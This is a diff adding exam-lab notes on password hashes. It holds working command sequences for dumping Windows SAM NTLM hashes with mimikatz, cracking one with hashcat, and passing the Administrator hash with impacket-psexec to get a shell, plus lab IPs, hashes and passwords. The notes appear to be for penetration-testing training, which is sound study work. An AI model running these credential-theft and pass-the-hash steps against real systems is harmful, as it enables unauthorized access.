@@ -388,4 +388,103 @@ cat 123_flag.txt
 
 # 15.3 Password Hashes
 
+### Cracking NTLM
 
+2. Access VM #2 via RDP as user _nadine_ with the password retrieved in the exercise of the section labelled "Password Manager" and leverage the methods from this section to extract the NTLM hash of the user _steve_. Use **best64.rule** for the cracking process and enter the plain text password as answer to this exercise
+
+- Password is *123abc*
+```bash
+# RDP nadine:123abc
+xfreerdp /cert-ignore /compression /auto-reconnect /u:nadine /p:123abc /v:192.168.201.227
+```
+
+```powershell
+# Enumerate local users
+Get-LocalUser
+	Name               Enabled Description
+	----               ------- -----------
+	Administrator      False   Built-in account for administering the computer/domain
+	DefaultAccount     False   A user account managed by the system.
+	Guest              False   Built-in account for guest access to the computer/domain
+	nadine             True
+	offsec             True
+	steve              True
+
+# Use mimikatz to extract hash
+cd C:\Tools
+.\mimikatz.exe
+
+mimikatz # privilege::debug
+	Privilege '20' OK
+
+mimikatz # token::elevate
+	Token Id  : 0
+	User name :
+	SID name  : NT AUTHORITY\SYSTEM
+	
+	656     {0;000003e7} 1 D 40813          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+	 -> Impersonated !
+
+mimikatz # lsadump::sam
+	RID  : 000003eb (1003)
+	User : steve
+	  Hash NTLM: 2835573fb334e3696ef62a00e5cf7571
+```
+
+```bash
+# Copy to kali
+echo 2835573fb334e3696ef62a00e5cf7571 > steve.hash
+
+# Crack
+hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+	2835573fb334e3696ef62a00e5cf7571:francesca77
+
+# Test by RDP'ing in as steve:francesca77
+```
+
+
+### Passing-the-Hash
+
+1. Use the methods from this section to get access to VM #2 and find the flag on the desktop of the user _Administrator_.
+
+- Grab NTLM hash of Administrator
+```powershell
+cd C:\Tools
+.\mimikatz.exe
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+	...
+	-> Impersonated !
+
+mimikatz # lsadump::sam
+	Domain : FILES01
+	SysKey : 509cc0c46295a3eaf4c5c8eb6bf95db1
+	Local SID : S-1-5-21-1555802299-1328189896-734683769
+	
+	SAMKey : 201b0e3078f2be635aaaa055ab5a7828
+
+	RID  : 000001f4 (500)
+	User : Administrator
+	  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
+	  
+	RID  : 000003ef (1007)
+	User : paul
+	  Hash NTLM: 57373a907ccd7196a2bad219132d615f
+
+	RID  : 000003f0 (1008)
+	User : files02admin
+  Hash NTLM: e78ca771aeb91ea70a6f1bb372c186b6
+```
+
+- Get interactive shell
+```bash
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.201.212
+
+C:\Windows\System32>  type C:\Users\Administrator\Desktop\flag.txt
+```
+
+
+### Cracking Net-NTLMv2
